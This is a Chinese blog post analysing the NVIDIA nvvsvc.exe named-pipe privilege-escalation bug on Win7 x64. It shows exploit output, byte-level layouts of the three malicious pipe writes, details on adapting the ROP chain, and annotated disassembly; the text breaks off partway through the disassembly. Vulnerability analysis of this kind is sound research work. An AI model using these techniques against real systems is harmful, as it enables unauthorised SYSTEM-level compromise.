<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>idhyt&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="水中月.镜中花.浮华一片苍凉..">
<meta property="og:type" content="website">
<meta property="og:title" content="idhyt's blog">
<meta property="og:url" content="http://blog.idhyt.com/page/8/index.html">
<meta property="og:site_name" content="idhyt's blog">
<meta property="og:description" content="水中月.镜中花.浮华一片苍凉..">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="idhyt's blog">
<meta name="twitter:description" content="水中月.镜中花.浮华一片苍凉..">
  
    <link rel="alternate" href="/atom.xml" title="idhyt&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css" type="text/css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">idhyt&#39;s blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">云淡风轻</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜尋"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.idhyt.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-exploit-nvidia-elevate-privilege" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2013/01/09/exploit-nvidia-elevate-privilege/" class="article-date">
  <time datetime="2013-01-09T07:40:11.000Z" itemprop="datePublished">2013-01-09</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/exploit/">exploit</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/01/09/exploit-nvidia-elevate-privilege/">NVidia本地&amp;远程提权漏洞分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="漏洞背景">漏洞背景</h2><p>圣诞节，一个网名“Winter-Smith”(冬日史密斯)的黑客公布了NVIDIA显卡驱动中存在的一个严重安全漏洞，可以轻松获取系统权限。这位老兄还很厚道地在网上公开了漏洞的完整细节，有经验的黑客完全可以拿过来就利用，搞的NVIDIA的某些员工这个圣诞和新年是没法清净。</p>
<p>NVIDIA Driver Helper Service,是一个r3层的服务，程序是nvvsvc.exe(win7)或nvvsvc32.exe(xp)，这个程序启动后会创建一个命名管道\pipe\nvsr,比较特别的是这个管道的dacl是空,也就是说everyone都可以访问，xpx32版下0x52命令也不支持,同时老版本的xp版nvsvc32.exe根本没建命名管道。这个漏洞利用只针对win7x64版有效，在win7x32版上只能够做到infoleak。</p>
<h2 id="调试环境">调试环境</h2><p>系统环境      Win7sp1 x64  windbg  IDA<br>驱动程序提供商  NVIDIA GT520M<br>驱动程序版本  8.17.12.9555<br>服务名称  NVIDIA Display Driver Service<br>服务进程  nvvsvc.exe<br>需要说明的是，在windows xp下产生服务的程序是nvsvc32.exe，windows 7下产生服务的是nvvsvc.exe。</p>
<h2 id="漏洞分析">漏洞分析</h2><p>刚开始从网上找到源码，先在我的win7x32下编译运行，程序到第二步直接就挂掉了，提示：!! Unable to create named pipe。然后将程序编译成64位，在虚拟机里win7x64下运行，依然得到相同的结果。</p>
<p>开始看博客原文，大概了解以后知道是测试环境没有对，需要Nvidia的gt540m显卡和win7x64。而且在虚拟机里无法进行测试，因为需要nvvsvc.exe后台服务运行，虚拟机不支持。这就为测试环境提出了非常苛刻的条件。原文博客上记载如果测试成功，会增加一个r00t的管理员，测试窗口显示如下：</p>
<pre><code><span class="type">C</span>:\<span class="type">Users</span>\<span class="type">Peter</span>\<span class="type">Desktop</span>\<span class="type">NVDelMe1</span>&gt;nvvsvc_expl.exe <span class="number">127.0</span>.<span class="number">0.1</span>
** <span class="type">Nvvsvc</span>.exe <span class="type">Nsvr</span> <span class="type">Pipe</span> <span class="type">Exploit</span> (<span class="type">Local</span>/<span class="type">Domain</span>) **
[@peterwintrsmith]
- <span class="type">Win7</span> x64 <span class="type">DEP</span> + <span class="type">ASLR</span> + <span class="type">GS</span> <span class="type">Bypass</span> - <span class="type">Christmas</span> <span class="number">2012</span> -
<span class="type">Action</span> <span class="number">1</span> <span class="keyword">of</span> <span class="number">9</span>:  - <span class="type">CONNECT</span>
<span class="type">Action</span> <span class="number">2</span> <span class="keyword">of</span> <span class="number">9</span>:  - <span class="type">CLIENT</span> =&gt; <span class="type">SERVER</span>
<span class="type">Written</span> <span class="number">16416</span> (<span class="number">0x4020</span>) characters <span class="keyword">to</span> pipe
<span class="type">Action</span> <span class="number">3</span> <span class="keyword">of</span> <span class="number">9</span>:   - <span class="type">SERVER</span> =&gt; <span class="type">CLIENT</span>
<span class="type">Read</span> <span class="number">16504</span> (<span class="number">0x4078</span>) characters from pipe
<span class="type">Action</span> <span class="number">4</span> <span class="keyword">of</span> <span class="number">9</span>: <span class="type">Building</span> exploit ...
=&gt; <span class="type">Stack</span> cookie <span class="number">0xe2e2893340d4</span>:
=&gt; nvvsvc.exe base <span class="number">0x13fb90000</span>:
<span class="type">Action</span> <span class="number">5</span> <span class="keyword">of</span> <span class="number">9</span>:  - <span class="type">CLIENT</span> =&gt; <span class="type">SERVER</span>
<span class="type">Written</span> <span class="number">16416</span> (<span class="number">0x4020</span>) characters <span class="keyword">to</span> pipe
<span class="type">Action</span> <span class="number">6</span> <span class="keyword">of</span> <span class="number">9</span>:   - <span class="type">SERVER</span> =&gt; <span class="type">CLIENT</span>
<span class="type">Read</span> <span class="number">16384</span> (<span class="number">0x4000</span>) characters from pipe
<span class="type">Action</span> <span class="number">7</span> <span class="keyword">of</span> <span class="number">9</span>:  - <span class="type">CLIENT</span> =&gt; <span class="type">SERVER</span>
<span class="type">Written</span> <span class="number">16416</span> (<span class="number">0x4020</span>) characters <span class="keyword">to</span> pipe
<span class="type">Action</span> <span class="number">8</span> <span class="keyword">of</span> <span class="number">9</span>:   - <span class="type">SERVER</span> =&gt; <span class="type">CLIENT</span>
<span class="type">Read</span> <span class="number">16896</span> (<span class="number">0x4200</span>) characters from pipe
<span class="type">Action</span> <span class="number">9</span> <span class="keyword">of</span> <span class="number">9</span>:  - <span class="type">DISCONNECT</span>
</code></pre><p>找到gt540m + win7x64这个环境以后测试只能走到第八步，错误提示：</p>
<pre><code>!! Error reading <span class="keyword">from</span> pipe (<span class="keyword">at</span> least, no data <span class="function_start"><span class="keyword">on</span></span> pipe)
</code></pre><p>然后我在自己的电脑上gt520m + win7x64测试也是得到相同的结果，挂到第八步，这样的话就需要去分析源码了。</p>
<p>源码的大概流程是先查找目标机是否存在一个名字为nvsr的管道，如果存在与其进行连接，通过往管道里写入数据从得到的返回数据里得到目标机泄漏出来的cookie和nvvsvc.exe基址，然后通过构造ROP链突破DEP执行shellcode,增加管理员r00t也就是shellcode完成的工作。Shellcode的执行是在nvvsvc进程中执行的，而nvvsvc.exe驱动服务具有管理员权限，因此就完成了提权的过程。</p>
<p>通过对源码的分析，回过头看，挂在第二步肯定就是没找到nvsr管道。本机存在管道的查看可以通过pipelist工具进行查看。挂在第八步就需要对源码进行调试分析，看到底是哪里出错了。通过与测试成功窗口进行对比，挂在第八步的时候，我们看到第四步，并没有显示=&gt; nvvsvc.exe base 0x13fb90000:这条提示符，也就是说并没有找对nvvsvc.exe基址。</p>
<p>在第四步代码之前下断点，经过多次调试以后，发现不同的Nvidia驱动版本对应的匹配字节是不相同的。比如在我的gt520m 驱动版本：8.17.12.9555上边测试就应该是0xb41，这样匹配以后才能算出正确的nvvsvc.exe基址。后边在经过测试验证，在相同的显卡，不同的驱动版本下匹配字节也是不相同的，这就是为什么我们找到了gt540m+win7x64的环境依然不能得到正确的结果。再后来又经过测试，在不同的显卡，相同的驱动版本下匹配字节相同，也就是可以做到通用。在整个调试过程中，不能在虚拟机调试，而且只要调试过一次，nvvsvc.exe后台驱动服务就会挂掉，需要重新启动系统才可以恢复，是一个相当麻烦的过程。</p>
<p>问题找到后，接下来就是构造ROP链的问题了，因为基址不同，ROP链也需要自己重新构造。在构造ROP链过程中，遇到了两个问题，首先是virtualprotect函数参数的使用，源码中给了第二个参数dwSize赋值的是0x1，源码中说明是整个一页，但是实际测试中并不能够成功，最后将其改成0x300成功。第二个问题也是想了很久，也是一个很有意思的问题，在构造ROP链的最后一步jmp rsp，这条指令地址为基址+0xb7153，在调试时候始终跳不过去执行shellcode，最后找到的原因是因为这个偏移太大了，已经不在代码段了，因此是不可执行的指令，最后换上call rsp成功实现跳转执行shellcode。</p>
<h2 id="漏洞利用">漏洞利用</h2><p>攻击者先查找是否能够找到命名管道<a href="file:///\\pipe\nvsr" target="_blank" rel="external">\pipe\nvsr</a>，如果找到就与其建立通信，分三次往管道中写入数据，第一次泄漏出模块基址用于构造ROP链，第二次将带有ROP链和shellcode的数据写入管道，第三次重新布局数据最后执行shellcode.由于nvvsvc服务具有管理员权限，因此就实现了提权过程。</p>
<h3 id="泄漏出模块基址构造ROP链">泄漏出模块基址构造ROP链</h3><p>第一次写入数据BuildMalicious_LeakStack()总共0x4020字节</p>
<pre><code>Base + <span class="number">0x0000</span>          <span class="number">52</span> <span class="number">00</span>
Base + <span class="number">0x0002</span>          <span class="number">41</span> <span class="number">00</span> <span class="number">41</span> <span class="number">00</span> <span class="number">41</span> <span class="number">00</span> <span class="number">41</span> <span class="number">00.</span>...
Base + <span class="number">0x4002</span>          <span class="number">00</span> <span class="number">00</span>
Base + <span class="number">0x4004</span>          <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>
Base + <span class="number">0x4008</span>          <span class="number">78</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span>
Base + <span class="number">0x400c</span>          <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>
Base + <span class="number">0x4010</span>          <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>
Base + <span class="number">0x4014</span>          <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>
Base + <span class="number">0x4018</span>          <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>
Base + <span class="number">0x401c</span>          <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>
</code></pre><p>读出数据 0x4200（即nvvsvc服务写入管道数据0x4078）</p>
<pre><code>rgReadBuf+<span class="number">0x0000</span>           <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>
rgReadBuf+<span class="number">0x0004</span>           <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>
rgReadBuf+<span class="number">0x0008</span>           <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>
rgReadBuf+<span class="number">0x000c</span>           <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>
rgReadBuf+<span class="number">0x0010</span>           <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>
rgReadBuf+<span class="number">0x0010</span>           <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>
...
rgReadBuf+<span class="number">0x4034</span>         <span class="number">2</span>e <span class="number">5</span>d <span class="number">29</span> <span class="number">39</span> <span class="number">44</span> f5 <span class="number">00</span> <span class="number">00</span>
rgReadBuf+<span class="number">0x403c</span>           <span class="number">41</span> <span class="number">3</span>b <span class="number">7f</span> <span class="number">3f</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>
...
</code></pre><h3 id="ROP链和shellcode的数据写入管道">ROP链和shellcode的数据写入管道</h3><p>nvvsvc服务写入管道数据的方法：<br>首先会先取管道中数据（即攻击者CLIENT写入管道的数据）头两个字节作为操作判断符号，本漏洞利用的就是0x52操作，操作方式为读写数据。然后判断第三个字节是否为0x00，如果不为0x00，循环判断，最多循环0x2000次，判断结束后，将其后边数据偏移四个字节作为写入管道的数据长度，如上边的0x4078.然后将长度后边的数据作为写入管道的数据，如上边的0x41414141。也就是说最后nvvsvc服务先将Base + 0x400c处开始的长度为0x4078个数据复制到Base + 0x4020处，最后再将这些数据写入管道中。在调用复制数据函数的时候没有做任何有关长度的检测，导致将base+0x400c+0x4034的cookie和base+0x400c+0x403c处的模块基址（需要减去一个偏移）泄漏出来并写入管道，最后攻击者CLIENT读出这些数据加以利用。</p>
<p>base+0x400c+0x403c处的模块基址需要做一些处理才能使用，比如上边读到的是0x013f7f3b41,先将这个值&amp;0xfff得到后三位0xb41，这个值对应着每个NviDia的驱动版本，不同版本的驱动程序释放出来的nvvsvc.exe模块代码稍有不同，因此构造ROP链也会有差异。最后将0x013f7f3b41减去后四位0x3b41就得到了nvvsvc.exe模块基址。</p>
<p>第二次 写入数据BuildMalicious_FillBuf() 总共0x4020</p>
<pre><code>Base + <span class="number">0x0000</span>          <span class="number">52</span> <span class="number">00</span>
Base + <span class="number">0x0002</span>          <span class="number">00</span> <span class="number">00</span>
Base + <span class="number">0x0004</span>          <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>
Base + <span class="number">0x0008</span>          <span class="number">00</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span>
Base + <span class="number">0x000c</span>          <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43.</span>..
Base + <span class="number">0x0018</span>          <span class="number">2</span>e <span class="number">5</span>d <span class="number">29</span> <span class="number">39</span> <span class="number">44</span> f5 <span class="number">00</span> <span class="number">00</span> cookie
Base + <span class="number">0x0020</span>          <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43.</span>...
Base + <span class="number">0x0040</span>          ROP链...
Base + <span class="number">0x0158</span>          shellcode...
...
其他<span class="number">0x43</span>覆盖
</code></pre><p>读出数据 0x4000（即nvvsvc服务写入管道数据0x4000）</p>
<pre><code>rgReadBuf+<span class="number">0x0000</span>           <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43.</span>..
...
rgReadBuf+<span class="number">0x0044</span>           ROP链...
rgReadBuf+<span class="number">0x014c</span>           shellcode...
...
其他<span class="number">0x43</span>覆盖
</code></pre><p>第三次 写入数据BuildMalicious_OverwriteStack() 总共0x4020</p>
<pre><code>Base + <span class="number">0x0000</span>          <span class="number">52</span> <span class="number">00</span>
Base + <span class="number">0x0002</span>          <span class="number">00</span> <span class="number">00</span>
Base + <span class="number">0x0004</span>          <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>
Base + <span class="number">0x0008</span>          <span class="number">40</span> <span class="number">43</span> <span class="number">00</span> <span class="number">00</span>
Base + <span class="number">0x000c</span>          <span class="number">42</span> <span class="number">42</span> <span class="number">42</span> <span class="number">42.</span>..
...
</code></pre><p>经过管道处理复制（0x4340个字节）以后,在nvvsvc模块缓冲区中</p>
<pre><code>Base + <span class="number">0x0000</span>          <span class="number">52</span> <span class="number">00</span>
Base + <span class="number">0x0002</span>          <span class="number">00</span> <span class="number">00</span>
Base + <span class="number">0x0004</span>          <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>
Base + <span class="number">0x0008</span>          <span class="number">40</span> <span class="number">43</span> <span class="number">00</span> <span class="number">00</span>
Base + <span class="number">0x000c</span>          <span class="number">42</span> <span class="number">42</span> <span class="number">42</span> <span class="number">42.</span>..
...
Base+<span class="number">0x401c</span>            <span class="number">42</span> <span class="number">42</span> <span class="number">42</span> <span class="number">42</span>
Base+<span class="number">0x4020</span>            <span class="number">42</span> <span class="number">42</span> <span class="number">42</span> <span class="number">42</span>
...
Base+<span class="number">0x8034</span>            <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span>
...
Base+<span class="number">0x8064</span>            rop链...
Base+<span class="number">0x8078</span>            shellcode...
...
</code></pre><p>通过控制复制的字节长度，最后一步恢复堆栈时候 lea     r11,[rsp+82B0h]将跳到我们控制的地方。<br>读出数据 0x4200（nvvsvc服务写入管道数据0x4340）</p>
<pre><code>rgReadBuf+<span class="number">0x0000</span>           <span class="number">42</span> <span class="number">42</span> <span class="number">42</span> <span class="number">42.</span>..
...
rgReadBuf+<span class="number">0x4014</span>           <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span>
...
rgReadBuf+<span class="number">0x4044</span>           rop链...
rgReadBuf+<span class="number">0x414c</span>           shellcode...
...
</code></pre><p>IDA关键代码：</p>
<pre><code><span class="string">.text</span>:0000000000003B18                 <span class="keyword">mov</span>     <span class="literal">rax</span>, <span class="literal">rsp</span>
<span class="string">.text</span>:0000000000003B1B                 <span class="keyword">mov</span>     [<span class="literal">rax</span>+<span class="number">10h</span>], <span class="literal">rbx</span>
<span class="string">.text</span>:0000000000003B1F                 <span class="keyword">mov</span>     [<span class="literal">rax</span>+<span class="number">18h</span>], <span class="literal">rsi</span>
<span class="string">.text</span>:0000000000003B23                 <span class="keyword">mov</span>     [<span class="literal">rax</span>+<span class="number">20h</span>], <span class="literal">rdi</span>
<span class="string">.text</span>:0000000000003B27                 <span class="keyword">push</span>    <span class="literal">rbp</span>
<span class="string">.text</span>:0000000000003B28                 <span class="keyword">push</span>    <span class="literal">r12</span>
<span class="string">.text</span>:0000000000003B2A                 <span class="keyword">push</span>    <span class="literal">r13</span>
<span class="string">.text</span>:0000000000003B2C                 <span class="keyword">push</span>    <span class="literal">r14</span>
<span class="string">.text</span>:0000000000003B2E                 <span class="keyword">push</span>    <span class="literal">r15</span>
<span class="string">.text</span>:0000000000003B30                 <span class="keyword">lea</span>     <span class="literal">rbp</span>, [<span class="literal">rax</span>-<span class="number">81D8h</span>]
<span class="string">.text</span>:0000000000003B37                 <span class="keyword">mov</span>     <span class="literal">eax</span>, <span class="number">82B0h</span>
<span class="string">.text</span>:0000000000003B3C                 <span class="keyword">call</span>    sub_49880
<span class="string">.text</span>:0000000000003B41                 <span class="keyword">sub</span>     <span class="literal">rsp</span>, <span class="literal">rax</span>
<span class="string">.text</span>:0000000000003B44                 <span class="keyword">mov</span>     <span class="literal">rax</span>, <span class="literal">cs</span>:qword_C5148
<span class="string">.text</span>:0000000000003B4B                 <span class="keyword">xor</span>     <span class="literal">rax</span>, <span class="literal">rsp</span>
<span class="string">.text</span>:0000000000003B4E                 <span class="keyword">mov</span>     [<span class="literal">rbp</span>+<span class="number">81A0h</span>], <span class="literal">rax</span>
<span class="string">.text</span>:0000000000003B55                 <span class="keyword">xor</span>     <span class="literal">r14d</span>, <span class="literal">r14d</span>
<span class="string">.text</span>:0000000000003B58                 <span class="keyword">lea</span>     <span class="literal">r9</span>, [<span class="literal">rsp</span>+<span class="number">28h</span>+NumberOfBytesRead] <span class="comment">; lpNumberOfBytesRead</span>
<span class="string">.text</span>:0000000000003B5D                 <span class="keyword">lea</span>     <span class="literal">rdx</span>, [<span class="literal">rbp</span>+<span class="number">160h</span>] <span class="comment">; lpBuffer</span>
<span class="string">.text</span>:0000000000003B64                 <span class="keyword">mov</span>     <span class="literal">r8d</span>, <span class="number">4020h</span>      <span class="comment">; nNumberOfBytesToRead</span>
<span class="string">.text</span>:0000000000003B6A                 <span class="keyword">mov</span>     <span class="literal">rsi</span>, <span class="literal">rcx</span>
<span class="string">.text</span>:0000000000003B6D                 <span class="keyword">mov</span>     [<span class="literal">rsp</span>+<span class="number">28h</span>+NumberOfBytesRead], <span class="literal">r14d</span>
<span class="string">.text</span>:0000000000003B72                 <span class="keyword">mov</span>     [<span class="literal">rsp</span>+<span class="number">28h</span>+NumberOfBytesWritten], <span class="literal">r14d</span>
<span class="string">.text</span>:0000000000003B77                 <span class="keyword">mov</span>     [<span class="literal">rsp</span>+<span class="number">28h</span>+nNumberOfBytesToWrite], <span class="literal">r14d</span>
<span class="string">.text</span>:0000000000003B7C                 <span class="keyword">mov</span>     [<span class="literal">rsp</span>+<span class="number">28h</span>+var_8], <span class="literal">r14</span>
<span class="string">.text</span>:0000000000003B81                 <span class="keyword">call</span>    <span class="literal">cs</span>:ReadFile
<span class="comment">; nvvsvc服务从管道固定读入4020个字节数据到缓冲区</span>
<span class="string">.text</span>:0000000000003B87                 <span class="keyword">test</span>    <span class="literal">eax</span>, <span class="literal">eax</span>
<span class="string">.text</span>:0000000000003B89                 <span class="keyword">jz</span>      loc_406F
<span class="string">.text</span>:0000000000003B8F                 <span class="keyword">mov</span>     <span class="literal">ebx</span>, <span class="number">2000h</span>
<span class="string">.text</span>:0000000000003B94                 <span class="keyword">lea</span>     <span class="literal">edi</span>, [<span class="literal">r14</span>+<span class="number">52h</span>]  <span class="comment">; edi=52h</span>
<span class="string">.text</span>:0000000000003B98                 <span class="keyword">lea</span>     <span class="literal">r15d</span>, [<span class="literal">r14</span>+<span class="number">12h</span>] <span class="comment">; r15=12h</span>
<span class="string">.text</span>:0000000000003B9C
<span class="string">.text</span>:0000000000003B9C loc_3B9C:                               <span class="comment">; CODE XREF: sub_3B18+551j</span>
<span class="string">.text</span>:0000000000003B9C                 <span class="keyword">cmp</span>     [<span class="literal">rsp</span>+<span class="number">28h</span>+NumberOfBytesRead], <span class="literal">r14d</span> <span class="comment">; [rsp+28h+NumberOfBytesRead]=4020h,r14d=0</span>
<span class="string">.text</span>:0000000000003BA1                 <span class="keyword">jz</span>      loc_406F
<span class="string">.text</span>:0000000000003BA7                 <span class="keyword">movzx</span>   <span class="literal">ecx</span>, <span class="preprocessor">word</span> <span class="preprocessor">ptr</span> [<span class="literal">rbp</span>+<span class="number">160h</span>]
<span class="comment">;将读入的数据头两个字节放入ecx中，ecx=0052，根据头两字节来判断操作，根据后边调试分析，0x52为管道读写操作，读写方法上边已经介绍。</span>
<span class="string">.text</span>:0000000000003BAE                 <span class="keyword">sub</span>     <span class="literal">ecx</span>, <span class="number">23h</span>        <span class="comment">; ecx=2f</span>
<span class="string">.text</span>:0000000000003BB1                 <span class="keyword">jz</span>      loc_3F70
<span class="string">.text</span>:0000000000003BB7                 <span class="keyword">sub</span>     <span class="literal">ecx</span>, <span class="number">20h</span>        <span class="comment">; ecx=f</span>
<span class="string">.text</span>:0000000000003BBA                 <span class="keyword">jz</span>      loc_3E9C
<span class="string">.text</span>:0000000000003BC0                 <span class="keyword">dec</span>     <span class="literal">ecx</span>
<span class="string">.text</span>:0000000000003BC2                 <span class="keyword">jz</span>      loc_3E41
<span class="string">.text</span>:0000000000003BC8                 <span class="keyword">sub</span>     <span class="literal">ecx</span>, <span class="number">3</span>
<span class="string">.text</span>:0000000000003BCB                 <span class="keyword">jz</span>      loc_3DBB
<span class="string">.text</span>:0000000000003BD1                 <span class="keyword">sub</span>     <span class="literal">ecx</span>, <span class="number">5</span>
<span class="string">.text</span>:0000000000003BD4                 <span class="keyword">jz</span>      loc_3D35
<span class="string">.text</span>:0000000000003BDA                 <span class="keyword">sub</span>     <span class="literal">ecx</span>, <span class="number">6</span>
<span class="string">.text</span>:0000000000003BDD                 <span class="keyword">jz</span>      loc_3CB2        <span class="comment">; 跳转</span>
<span class="string">.text</span>:0000000000003BE3                 <span class="keyword">cmp</span>     <span class="literal">ecx</span>, <span class="number">5</span>
<span class="string">.text</span>:0000000000003BE6                 <span class="keyword">jz</span>      short loc_3BFA
<span class="string">.text</span>:0000000000003BE8                 <span class="keyword">mov</span>     <span class="literal">r8d</span>, <span class="number">1Ch</span>
<span class="string">.text</span>:0000000000003BEE                 <span class="keyword">lea</span>     <span class="literal">rdx</span>, aUnknownToken <span class="comment">; "Unknown token"</span>
<span class="string">.text</span>:0000000000003BF5                 <span class="keyword">jmp</span>     loc_3F5F
......
<span class="label">text:</span>0000000000003CB2 loc_3CB2:                               <span class="comment">; CODE XREF: sub_3B18+C5j</span>
<span class="string">.text</span>:0000000000003CB2                 <span class="keyword">lea</span>     <span class="literal">rcx</span>, [<span class="literal">rbp</span>+<span class="number">162h</span>]
<span class="string">.text</span>:0000000000003CB9                 <span class="keyword">mov</span>     <span class="literal">rdx</span>, <span class="literal">rbx</span>
<span class="string">.text</span>:0000000000003CBC                 <span class="keyword">mov</span>     [<span class="literal">rsp</span>+<span class="number">28h</span>+arg_4], <span class="number">3</span>
<span class="string">.text</span>:0000000000003CC4                 <span class="keyword">call</span>    sub_462E0
<span class="comment">; 该函数的功能是循环判断rax次(rax最大2000h)，以0作为判断终止符，然后将rax返回，下边将根据rax来复制将要写入管道的数据。</span>
<span class="string">.text</span>:0000000000003CC9                 <span class="keyword">cmp</span>     <span class="literal">cs</span>:dword_D0990, <span class="literal">r14d</span>
<span class="string">.text</span>:0000000000003CD0                 <span class="keyword">lea</span>     <span class="literal">r9</span>, [<span class="literal">rsp</span>+<span class="number">28h</span>+arg_8]
<span class="string">.text</span>:0000000000003CD5                 <span class="keyword">mov</span>     <span class="literal">ecx</span>, [<span class="literal">rbp</span>+<span class="literal">rax</span>*<span class="number">2</span>+<span class="number">164h</span>]
<span class="comment">; ecx=0  [rbp+rax*2+164h]=000000007840000041414141...</span>
<span class="string">.text</span>:0000000000003CDC                 <span class="keyword">lea</span>     <span class="literal">rdi</span>, [<span class="literal">rbp</span>+<span class="literal">rax</span>*<span class="number">2</span>+<span class="number">16Ch</span>]
<span class="comment">; [rbp+rax*2+16Ch]=4141414141...</span>
<span class="string">.text</span>:0000000000003CE4                 <span class="keyword">lea</span>     <span class="literal">rdx</span>, [<span class="literal">rsp</span>+<span class="number">28h</span>+arg_4]
<span class="string">.text</span>:0000000000003CE9                 <span class="keyword">mov</span>     [<span class="literal">rsp</span>+<span class="number">28h</span>+arg_4], <span class="literal">ecx</span>
<span class="string">.text</span>:0000000000003CED                 <span class="keyword">mov</span>     <span class="literal">ecx</span>, [<span class="literal">rbp</span>+<span class="literal">rax</span>*<span class="number">2</span>+<span class="number">168h</span>] <span class="comment">; rcx=4078</span>
<span class="string">.text</span>:0000000000003CF4                 <span class="keyword">mov</span>     <span class="literal">r8</span>, <span class="literal">rdi</span>         <span class="comment">; [r8]=41414141...</span>
<span class="string">.text</span>:0000000000003CF7                 <span class="keyword">mov</span>     [<span class="literal">rsp</span>+<span class="number">28h</span>+arg_8], <span class="literal">ecx</span>
<span class="string">.text</span>:0000000000003CFB                 <span class="keyword">lea</span>     <span class="literal">rcx</span>, [<span class="literal">rbp</span>+<span class="number">162h</span>]
<span class="string">.text</span>:0000000000003D02                 <span class="keyword">jle</span>     short loc_3D0B
<span class="string">.text</span>:0000000000003D04                 <span class="keyword">call</span>    sub_2C84
<span class="string">.text</span>:0000000000003D09                 <span class="keyword">jmp</span>     short loc_3D10
<span class="string">.text</span>:0000000000003D0B <span class="comment">; ---------------------------------------------------------------------------</span>
<span class="label">
.text:</span>0000000000003D0B
<span class="string">.text</span>:0000000000003D0B loc_3D0B:                               <span class="comment">; CODE XREF: sub_3B18+1EAj</span>
<span class="string">.text</span>:0000000000003D0B                 <span class="keyword">call</span>    sub_2A00
<span class="string">.text</span>:0000000000003D10 <span class="comment">; ---------------------------------------------------------------------------</span>
<span class="label">
.text:</span>0000000000003D10
<span class="string">.text</span>:0000000000003D10 loc_3D10:                               <span class="comment">; CODE XREF: sub_3B18+1F1j</span>
<span class="string">.text</span>:0000000000003D10                 <span class="keyword">movsxd</span>  <span class="literal">rbx</span>, [<span class="literal">rsp</span>+<span class="number">28h</span>+arg_8]
<span class="string">.text</span>:0000000000003D15                 <span class="keyword">lea</span>     <span class="literal">rcx</span>, [<span class="literal">rbp</span>+<span class="number">4180h</span>]
<span class="string">.text</span>:0000000000003D1C                 <span class="keyword">mov</span>     <span class="literal">rdx</span>, <span class="literal">rdi</span>
<span class="string">.text</span>:0000000000003D1F                 <span class="keyword">mov</span>     <span class="literal">r8</span>, <span class="literal">rbx</span>
<span class="string">.text</span>:0000000000003D22                 <span class="keyword">call</span>    sub_45980
<span class="comment">; bug!!!复制数据函数  该函数的功能就是复制将要写入管道的数据，没有做任何检测，最后返回存放该数据缓冲区指针rax。该数据将发送回攻击者，长度为4078导致内存泄漏</span>
<span class="string">.text</span>:0000000000003D27                 <span class="keyword">mov</span>     [<span class="literal">rsp</span>+<span class="number">28h</span>+nNumberOfBytesToWrite], <span class="literal">ebx</span>
<span class="string">.text</span>:0000000000003D2B
<span class="string">.text</span>:0000000000003D2B loc_3D2B:                               <span class="comment">; CODE XREF: sub_3B18+156j</span>
<span class="string">.text</span>:0000000000003D2B                                         <span class="comment">; sub_3B18+198j</span>
<span class="string">.text</span>:0000000000003D2B                 <span class="keyword">mov</span>     <span class="literal">edi</span>, <span class="number">52h</span>
<span class="string">.text</span>:0000000000003D30                 <span class="keyword">jmp</span>     loc_4017
......
<span class="label">
.text:</span><span class="number">0000000000004017</span> loc_4017:                              <span class="comment">; CODE XREF: sub_3B18+218j</span>
<span class="string">.text</span>:<span class="number">0000000000004017</span>                                         <span class="comment">; sub_3B18+435j ...</span>
